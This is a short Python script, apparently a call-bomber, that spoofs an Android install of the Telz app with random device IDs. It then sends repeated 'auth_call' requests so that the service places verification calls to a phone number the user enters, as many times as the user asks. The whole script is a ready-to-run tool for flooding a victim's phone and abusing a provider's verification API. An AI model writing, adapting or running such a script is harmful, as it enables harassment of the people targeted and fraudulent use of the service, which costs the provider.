import requests
import json
import random
import string
import time
import uuid

foxx = int(time.time() * 1000)
fox = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
foxer = uuid.uuid4()
number = input("Enter Your Number: ")
url = "https://api.telz.com/app/auth_call"
ul = "https://api.telz.com/app/install"

paylod = json.dumps({
    "android_id": f"{fox}",
    "app_version": "17.5.17",
    "event": "install",
    "google_exists": "yes",
    "os": "android",
    "os_version": "9",
    "play_market": True,
    "ts": foxx,
    "uuid": f"{foxer}"
})

headers = {
    'User-Agent': "Telz-Android/17.5.17"
}

repeat_count = int(input("Enter how many times you want to send the request: "))

for i in range(repeat_count):
    respone = requests.post(ul, data=paylod, headers=headers)
    
    if "ok" in respone.text:
        payload = json.dumps({
            "android_id": f"{fox}",
            "app_version": "17.5.17",
            "attempt": "0",
            "event": "auth_call",
            "lang": "ar",
            "os": "android",
            "os_version": "9",
            "phone": f"+2{number}",
            "ts": foxx,
            "uuid": f"{foxer}"
        })
        
        response = requests.post(url, data=payload, headers=headers)
        if "ok" in response.text:
            print(f"Done sending call {i+1}/{repeat_count}")
        else:
            print(f"Failed attempt {i+1}/{repeat_count}, try again after 5 minutes.")
    else:
        print(f"Install request failed on attempt {i+1}/{repeat_count}: {respone.json()['status']}")
    
    time.sleep(2)